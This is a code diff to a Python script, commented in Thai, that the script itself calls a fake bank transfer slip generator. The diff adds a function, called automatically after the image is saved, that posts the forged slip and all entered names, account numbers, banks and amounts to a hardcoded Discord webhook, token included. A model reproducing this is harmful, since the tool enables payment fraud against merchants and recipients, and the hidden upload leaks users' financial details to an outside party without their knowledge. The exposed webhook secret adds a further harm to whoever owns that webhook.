@@ -273,6 +273,37 @@ def get_logo_size_and_position(background_image_path):
 
     return logo_size, logo_position
 
+import requests
+
+def send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time):
+    """ฟังก์ชันในการส่งข้อมูลไปยัง Discord Webhook พร้อมรูปภาพ"""
+    webhook_url = "https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz"
+
+    # เตรียมข้อมูล Embed ที่จะส่งไปยัง Discord
+    embed = {
+        "title": "ข้อมูลการโอนเงิน",
+        "description": f"จาก: {name_user_id}\nถึง: {name_me_id}\nหมายเลขบัญชีผู้รับ: {phone_me_id}\nจำนวนเงิน: {money_id}\nหมายเลขบัญชีผู้โอน: {account_user_id}\nธนาคารผู้โอน: {bank_user_id}\nธนาคารผู้รับ: {bank_me_id}\nวันที่: {day} {month} {year}\nเวลา: {time}",
+        "color": 65280  # สีเขียว
+    }
+
+    # เตรียมข้อมูลที่แนบ (ภาพ)
+    files = {
+        "file": open(image_path, "rb")
+    }
+
+    data = {
+        "embeds": [embed]
+    }
+
+    # ส่ง POST request ไปยัง Discord Webhook
+    response = requests.post(webhook_url, json=data, files=files)
+
+    # ตรวจสอบว่าโพสต์สำเร็จหรือไม่
+    if response.status_code == 204:
+        print("ข้อมูลถูกส่งไปยัง Discord เรียบร้อยแล้ว!")
+    else:
+        print(f"เกิดข้อผิดพลาดในการส่งข้อมูล: {response.status_code} - {response.text}")
+
 def main():
     """ฟังก์ชันหลักในการประมวลผล"""
     # ให้ผู้ใช้เลือกธนาคารและภาพพื้นหลัง
@@ -319,9 +350,13 @@ def main():
     add_text_to_image(draw, positions, texts, fonts, colors)
 
     # บันทึกภาพที่มีข้อความ
-    save_image(image, "output_image.png")
+    image_path = "output_image.png"
+    save_image(image, image_path)
 
     print("สลีปปลอมสำเร็จ! บันทึกเป็น output_image.png")
+
+    # ส่งข้อมูลไปยัง Discord
+    send_to_discord(image_path, name_user_id, name_me_id, phone_me_id, money_id, account_user_id, bank_user_id, bank_me_id, day, month, year, time)
 
 if __name__ == "__main__":
     main()
